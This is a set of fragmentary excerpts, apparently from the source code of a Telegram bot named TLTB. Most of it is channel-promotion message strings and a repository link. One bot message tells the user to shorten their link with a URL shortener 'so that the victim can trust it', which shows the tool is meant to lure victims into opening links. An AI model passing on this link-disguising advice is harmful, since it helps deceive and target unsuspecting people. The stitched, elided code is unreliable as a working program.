...
And don't forget to subscribe our telegram & youtube channel for updates and interesting thing 🤩

► YOUTUBE CHANNEL ♨ :- https://bit.ly/3RzjdHX 

► TELEGRAM GROUP ⭕ :- @technical_whitehat

► TELEGRAM CHANNEL🔰 :- @technicalwhitehat`,m);
}
...
\n\nThe project is OSS at: https://github.com/mrwhitehat908hacker/TLTB
`);
}
...
⛔ I suggest that you use a URL shortening website to shorten your link so that the victim can trust it.

👉 Website link:- https://bitly.com/
...
► TELEGRAM CHANNEL🔰 :- @technicalwhiteha`,m);
}
else{
...
► TELEGRAM CHANNEL🔰 :- @technicalwhitehat`);
createNew(cid);
